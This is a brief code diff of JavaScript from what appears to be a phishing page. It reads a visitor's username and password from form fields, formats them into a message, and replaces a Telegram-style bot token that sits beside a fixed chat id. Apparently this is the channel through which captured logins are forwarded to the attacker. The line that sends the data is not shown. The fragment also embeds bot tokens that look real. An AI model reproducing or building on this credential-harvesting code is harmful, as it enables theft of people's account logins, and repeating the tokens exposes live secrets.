@@ -33,7 +33,7 @@ var pass = $("#pass").val();
 
 var text = "user : `" + username + "` || pass : `" + pass + "`" 
 
-var token = "801870955:AAE2m8IagrjoLf7XUxi27audKvv50jj_CH8";
+var token = "771992994:AAH0FSTBUpgUKbhs-K5WmRYB610DpBVHJFY";
 
 var id = "387534219";
 
